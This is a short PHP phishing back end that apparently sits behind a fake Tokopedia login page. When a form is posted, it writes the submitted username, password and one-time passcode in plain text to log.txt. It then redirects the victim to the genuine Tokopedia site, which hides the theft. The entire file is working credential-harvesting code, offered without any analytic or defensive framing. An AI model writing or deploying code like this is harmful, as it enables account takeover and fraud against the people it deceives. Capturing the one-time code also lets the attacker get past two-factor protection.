<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST["username"] ?? "-";
    $pass = $_POST["password"] ?? "-";
    $otp = $_POST["otp"] ?? "-";

    $log = fopen("log.txt", "a");
    fwrite($log, "Username: $user | Password: $pass | OTP: $otp\n");
    fclose($log);

    header("Location: https://www.tokopedia.com/");
    exit();
}
?>
